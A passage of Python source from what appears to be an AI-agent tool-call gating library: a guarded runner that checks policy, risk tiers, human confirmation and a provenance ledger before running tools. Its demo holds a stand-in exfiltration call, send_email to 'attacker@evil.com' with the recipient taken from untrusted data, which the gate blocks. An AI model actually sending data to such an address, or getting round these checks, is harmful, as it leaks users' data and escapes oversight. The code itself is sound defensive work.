        if type(value) is CoroutineType:
            CoroutineType.close(value)
        elif type(value) is GeneratorType:
            GeneratorType.close(value)
    except Exception:
        pass


def _close_async_generator(value: Any) -> None:
    """Close an async-generator result even when called inside a running loop."""

    if type(value) is not AsyncGeneratorType:
        return
    try:
        close_awaitable = AsyncGeneratorType.aclose(value)
    except Exception:
        return

    def close_in_fresh_loop() -> None:
        async def await_close() -> None:
            await close_awaitable

        try:
            asyncio.run(await_close())
        except Exception:
            _close_awaitable(close_awaitable)

    try:
        asyncio.get_running_loop()
    except RuntimeError:
        close_in_fresh_loop()
        return

    closer = threading.Thread(target=close_in_fresh_loop, daemon=True)
    closer.start()
    closer.join()


@dataclass
class ExecutionResult:
    """Outcome of gating and synchronous implementation completion.

    ``invoked`` becomes true as soon as the callable is entered. ``executed``
    is stricter: the callable completed synchronously with a plain JSON result
    that was isolated and recorded in the provenance ledger. If entering the
    implementation raises ``Exception``, the exception is not exposed or
    propagated: the result reports ``invoked=True``, ``executed=False``, and
    ``contract_violation='invocation_exception'``. Process-control
    ``BaseException`` subclasses still propagate.
    """

    decision: Decision
    executed: bool
    result: Any = None
    invoked: bool = False
    contract_violation: str | None = None


class GuardedToolRunner:
    """Execute registered callables only after Verb Authority allows the call.

    The runner is intentionally synchronous and provider-neutral. Applications
    normalize a provider tool call to ``{"name": ..., "input": ...}``, then
    call :meth:`run`. A confirmation callback is required for any decision with
    ``needs_confirm=True``; without one, the runner does not execute the tool.
    Successful tool results are recorded in the session ledger automatically.
    One per-ledger re-entrant lock serializes the final gate, invocation, and
    result publication. Human confirmation runs outside that lock; after it
    returns, configuration and ledger state are revalidated while locked.

    The registration identity commits Python code content and its raw binding
    signature. It does not snapshot mutable globals, closure cells, or bound
    instance/callable-object state. Implementations and confirmation callbacks
    are trusted application code; applications must keep that semantic state
    stable (or externally synchronize it) for the duration of a call.
    """

    def __init__(
        self,
        registry: Registry,
        policy_set: PolicySet | None = None,
        *,
        ledger: ProvenanceLedger | None = None,
    ) -> None:
        if type(registry) is not Registry:
            raise TypeError("registry must be an exact Registry instance")
        if policy_set is not None and type(policy_set) is not PolicySet:
            raise TypeError("policy_set must be an exact PolicySet instance")
        if ledger is not None and type(ledger) is not ProvenanceLedger:
            raise TypeError("ledger must be an exact ProvenanceLedger instance")
        self.registry = registry
        self._session_ledger = ledger if ledger is not None else ProvenanceLedger()
        self._ledger_internal_binding = _ledger_internal_binding(
            self._session_ledger
        )
        # Public beta compatibility. Replacing this alias is detected before
        # execution; all approved work remains bound to _session_ledger.
        self.ledger = self._session_ledger
        self._bundle = _make_registration_bundle(registry, policy_set)
        # Preserve the public inspection surface without exposing the exact
        # object the runner enforces. Even deliberate same-process mutation of
        # this view cannot alter the authoritative bundle.
        enforced_policy = self._bundle.policy_set
        inspection_policy = MappingProxyType(
            {
                name: MappingProxyType(
                    {
                        parameter: _policy_literal(policy)
                        for parameter, policy in parameters.items()
                    }
                )
                for name, parameters in enforced_policy.policy.items()
            }
        )
        inspection_risk = MappingProxyType(
            {
                name: _risk_literal(risk)
                for name, risk in enforced_policy.risk.items()
            }
        )
        inspection_assessments = MappingProxyType(
            {
                name: _risk_assessment_snapshot(assessment)
                for name, assessment in enforced_policy.risk_inference.items()
            }
        )
        self.policy_set = _FrozenPolicySet(
            policy=inspection_policy,
            risk=inspection_risk,
            review=enforced_policy.review,
            confirm=enforced_policy.confirm,
            risk_inference=inspection_assessments,
            risk_review=enforced_policy.risk_review,
            risk_conflicts=enforced_policy.risk_conflicts,
            registry_binding=enforced_policy.registry_binding,
            registry_version=enforced_policy.registry_version,
        )
        self._source_policy = policy_set
        if policy_set is None:
            self._source_policy_state = None
        else:
            self._source_policy_state = _live_policy_state(
                policy_set,
                self._bundle.registry,
            )
            if self._source_policy_state is None:
                raise ValueError(
                    "policy state could not be snapshotted; rebuild it from "
                    "the registry"
                )

    def _configuration_drift(self) -> Decision | None:
        if self.ledger is not self._session_ledger:
            return Decision(
                False,
                "provenance ledger changed; rebuild the guarded runner",
            )
        try:
            ledger_binding = _ledger_internal_binding(self._session_ledger)
        except Exception:
            return Decision(
                False,
                "provenance ledger internals changed; rebuild the guarded runner",
            )
        if ledger_binding != self._ledger_internal_binding:
            return Decision(
                False,
                "provenance ledger internals changed; rebuild the guarded runner",
            )
        if self._session_ledger.saturated:
            return Decision(
                False,
                "provenance ledger capacity exhausted; start a new session",
            )
        if _live_registry_state(self.registry) != self._bundle.source_state:
            return Decision(False, "registry changed; rebuild the guarded runner")
        if self._source_policy is not None:
            current_policy_state = _live_policy_state(
                self._source_policy,
                self._bundle.registry,
            )
            if (
                current_policy_state is None
                or current_policy_state != self._source_policy_state
            ):
                return Decision(
                    False,
                    "policy changed; rebuild the guarded runner",
                )
        return None

    def _invoke_locked(
        self,
        decision: Decision,
        approved_call: dict[str, Any],
        implementation: Callable[..., Any],
        approved_ledger: ProvenanceLedger,
    ) -> ExecutionResult:
        """Invoke and publish while the caller holds ``approved_ledger._lock``."""

        tool_name = approved_call["name"]
        display_tool = _safe_reason_text(tool_name)
        try:
            result = implementation(**approved_call["input"])
        except Exception:
            return ExecutionResult(
                Decision(False, f"verb '{display_tool}' raised during invocation"),
                executed=False,
                invoked=True,
                contract_violation="invocation_exception",
            )
        try:
            approved_result = _snapshot_json_value(result)
        except _JSONSnapshotBudgetExceeded:
            return ExecutionResult(
                Decision(
                    False,
                    f"verb '{display_tool}' returned a result beyond the "
                    "plain-JSON snapshot budget; do not retry this "
                    "already-invoked tool",
                ),
                executed=False,
                invoked=True,
                contract_violation="unsupported_result",
            )
        except Exception:
            # Validate the exact plain-JSON boundary before classifying native
            # asynchronous objects.  ABC/inspect predicates use protocol and
            # ``__class__`` machinery on arbitrary objects; a rejected result
            # must not get a second attacker-controlled callback opportunity.
            if type(result) is AsyncGeneratorType:
                _close_async_generator(result)
                return ExecutionResult(
                    Decision(
                        False,
                        f"verb '{display_tool}' returned an async generator; "
                        "the synchronous runner rejected the result; do not "
                        "retry this already-invoked tool",
                    ),
                    executed=False,
                    invoked=True,
                    contract_violation="async_generator_result",
                )
            if _is_native_awaitable(result):
                _close_awaitable(result)
                return ExecutionResult(
                    Decision(
                        False,
                        f"verb '{display_tool}' returned an awaitable; "
                        "the synchronous runner rejected the result; do not "
                        "retry this already-invoked tool",
                    ),
                    executed=False,
                    invoked=True,
                    contract_violation="awaitable_result",
                )
            return ExecutionResult(
                Decision(
                    False,
                    f"verb '{display_tool}' returned a non-plain JSON result; "
                    "do not retry this already-invoked tool",
                ),
                executed=False,
                invoked=True,
                contract_violation="unsupported_result",
            )
        try:
            approved_ledger.record_result(approved_result)
        except _LedgerCapacityExceeded:
            return ExecutionResult(
                Decision(
                    False,
                    f"verb '{display_tool}' completed but the provenance "
                    "ledger capacity was exhausted; start a new session and "
                    "do not retry this already-invoked tool",
                ),
                executed=False,
                invoked=True,
                contract_violation="ledger_capacity_exceeded",
            )
        except Exception:
            return ExecutionResult(
                Decision(
                    False,
                    f"verb '{display_tool}' result could not be recorded "
                    "safely in the provenance ledger",
                ),
                executed=False,
                invoked=True,
                contract_violation="ledger_recording_failure",
            )
        return ExecutionResult(
            decision,
            executed=True,
            result=approved_result,
            invoked=True,
        )

    def run(
        self,
        tool_use: dict,
        *,
        trusted_args: dict | None = None,
        confirm: Callable[[ConfirmationRequest], bool] | None = None,
    ) -> ExecutionResult:
        drift = self._configuration_drift()
        if drift is not None:
            return ExecutionResult(drift, executed=False)
        try:
            approved_call, approved_trusted_args = _snapshot_tool_call(
                tool_use,
                trusted_args,
            )
        except Exception:
            return ExecutionResult(
                Decision(False, "tool call could not be snapshotted safely"),
                executed=False,
            )
        approved_ledger = self._session_ledger
        with approved_ledger._lock:
            drift = self._configuration_drift()
            if drift is not None:
                return ExecutionResult(drift, executed=False)
            decision = dispatch(
                self._bundle.registry,
                self._bundle.policy_set,
                approved_call,
                trusted_args=approved_trusted_args,
                ledger=approved_ledger,
            )
            if not decision.allow:
                return ExecutionResult(decision, executed=False)

            tool_name = approved_call["name"]
            display_tool = _safe_reason_text(tool_name)
            implementation = self._bundle.registry.tools[tool_name].fn
            if implementation is None:
                return ExecutionResult(
                    Decision(False, f"verb '{display_tool}' has no implementation"),
                    executed=False,
                )
            if _is_async_callable(implementation):
                return ExecutionResult(
                    Decision(
                        False,
                        f"verb '{display_tool}' has an async implementation; "
                        "the synchronous runner rejects it",
                    ),
                    executed=False,
                )
            if not decision.needs_confirm:
                return self._invoke_locked(
                    decision,
                    approved_call,
                    implementation,
                    approved_ledger,
                )
            if confirm is None:
                return ExecutionResult(decision, executed=False)
            try:
                request = _confirmation_request(
                    self._bundle,
                    decision,
                    approved_call,
                    approved_ledger,
                )
            except Exception:
                return ExecutionResult(
                    Decision(
                        False,
                        "confirmation request could not be serialized safely",
                    ),
                    executed=False,
                )
            # The callback receives a display object. Retain all enforcement
            # commitments privately so deliberate frozen-object mutation
            # cannot rewrite the version that was actually approved.
            confirmed_ledger_version = request.ledger_version

        # Confirmation is trusted application/UI code and may block. It runs
        # outside the session lock; the complete action is revalidated below.
        confirmation = confirm(request)
        if confirmation is True:
            pass
        elif type(confirmation) is AsyncGeneratorType:
            _close_async_generator(confirmation)
            return ExecutionResult(
                Decision(False, "confirmation callback must be synchronous"),
                executed=False,
                contract_violation="awaitable_confirmation",
            )
        elif _is_native_awaitable(confirmation):
            _close_awaitable(confirmation)
            return ExecutionResult(
                Decision(False, "confirmation callback must be synchronous"),
                executed=False,
                contract_violation="awaitable_confirmation",
            )
        else:
            return ExecutionResult(decision, executed=False)

        with approved_ledger._lock:
            drift = self._configuration_drift()
            if drift is not None:
                return ExecutionResult(drift, executed=False)
            revalidated = dispatch(
                self._bundle.registry,
                self._bundle.policy_set,
                approved_call,
                trusted_args=approved_trusted_args,
                ledger=approved_ledger,
            )
            if not revalidated.allow:
                return ExecutionResult(revalidated, executed=False)
            if approved_ledger.version != confirmed_ledger_version:
                return ExecutionResult(
                    Decision(
                        False,
                        "provenance ledger changed; request confirmation again",
                    ),
                    executed=False,
                )
            return self._invoke_locked(
                revalidated,
                approved_call,
                implementation,
                approved_ledger,
            )


# === demo =================================================================
def demo() -> None:
    reg = Registry()
    reg.add(Tool("send_email", [
        Param("to", "email"),
        Param("subject", "string", required=False),
        Param("body", "string"),
    ], risk=Risk.WRITE))
    reg.add(Tool("search_web", [
        Param("query", "string"), Param("num_results", "integer")
    ], risk=Risk.READ_ONLY))
    reg.add(Tool("delete_record", [
        Param("table", "string"), Param("record_id", "string")
    ], risk=Risk.DESTRUCTIVE))
    ps = build_policy(reg)

    print("risk tiers:    ", {t: r.value for t, r in ps.risk.items()})
    print("needs confirm: ", ps.confirm)
    print("review queue:  ", ps.review)
    print()

    d = gate(
        reg,
        ps,
        "send_email",
        {"to": "attacker@evil.com", "subject": "", "body": "x"},
        {"to": "data", "subject": "trusted", "body": "data"},
    )
    print("attack send_email(to=attacker):", "BLOCKED" if not d.allow else "ALLOW", "-", d.reason)

    d = gate(
        reg,
        ps,
        "send_email",
        {"to": "alice@company.com", "subject": "", "body": "summary"},
        {"to": "trusted", "subject": "trusted", "body": "data"},
    )
    print("legit  send_email(to=alice):   ", "ALLOW" if d.allow else "BLOCKED", "-", d.reason)

    d = gate(reg, ps, "delete_record", {"table": "users", "record_id": "42"},
             {"table": "trusted", "record_id": "trusted"})
    print("delete_record:                 ",
          "NEEDS CONFIRM" if d.needs_confirm else ("ALLOW" if d.allow else "BLOCKED"), "-", d.reason)


def main(argv: list[str] | None = None) -> int:
    """Run the demo, local schema scanner, or authority-diff command."""
    argv = list(sys.argv[1:] if argv is None else argv)
    if argv and argv[0] == "scan":
        from verb_authority_scan import main as scan_main

        return scan_main(argv[1:])
    if argv and argv[0] == "diff":
        from verb_authority_diff import main as diff_main

        return diff_main(argv[1:])
    if argv:
        print(
            "usage: env -u PYTHONPATH -u PYTHONHOME python -I -m "
            "verb_authority [scan|diff ...]",
            file=sys.stderr,
        )
        return 2
    demo()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
